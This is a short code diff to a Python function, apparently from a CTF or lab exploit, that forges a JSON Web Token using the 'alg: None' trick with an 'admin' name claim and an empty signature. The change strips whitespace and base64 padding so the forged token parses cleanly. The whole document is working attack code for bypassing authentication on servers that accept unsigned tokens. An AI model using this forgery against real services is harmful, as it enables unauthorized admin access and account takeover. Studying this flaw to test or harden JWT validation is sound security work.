@@ -6,12 +6,12 @@ import jwt
 import base64
 
 def jwt_handle():
-    none_head = b'{"alg": "None"}'
-    admin_payload = b'{"name": "admin"}'
+    none_head = b'{"alg":"None"}'
+    admin_payload = b'{"name":"admin"}'
 
     none_head_b64encode = base64.b64encode(none_head)
     admin_payload_b64encode = base64.b64encode(admin_payload)
-    new_admin_jwt_token = none_head_b64encode.decode("utf-8") + "." + admin_payload_b64encode.decode("utf-8") + "."
+    new_admin_jwt_token = none_head_b64encode.decode("utf-8").rstrip("=") + "." + admin_payload_b64encode.decode("utf-8").rstrip("=") + "."
 
     return new_admin_jwt_token
 
